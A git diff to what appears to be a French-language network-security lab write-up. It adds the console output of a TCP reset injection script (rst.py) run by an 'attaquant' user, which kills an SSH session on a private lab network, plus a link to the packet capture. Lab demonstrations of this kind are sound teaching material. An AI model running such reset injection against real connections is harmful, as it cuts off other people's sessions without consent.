@@ -32,3 +32,20 @@ print(answer[DNS].summary()) # évidement on aura pas de réponse sur la machine
 	
 [DNS spoof query](dns_flood.pcapng)
 
+```
+[attaquant@localhost toto]# python3 rst.py
+ip src >> 10.3.3.1
+ip dst >> 10.3.3.2
+port src >> 56100
+port dst >> 22
+Seq nb >> 2819881537
+Ack nb >> 3424035478
+[ 3029.781295 ] device enp0s3 entered promiscuous mode
+[ 3029.781295 ] device enp0s3 left promiscuous mode
+```
+
+```
+[toto@localhost ~]$ aclient_loop: send disconnect: Broken pipe
+```
+
+[TCP rst](tcp_rst.pcapng)
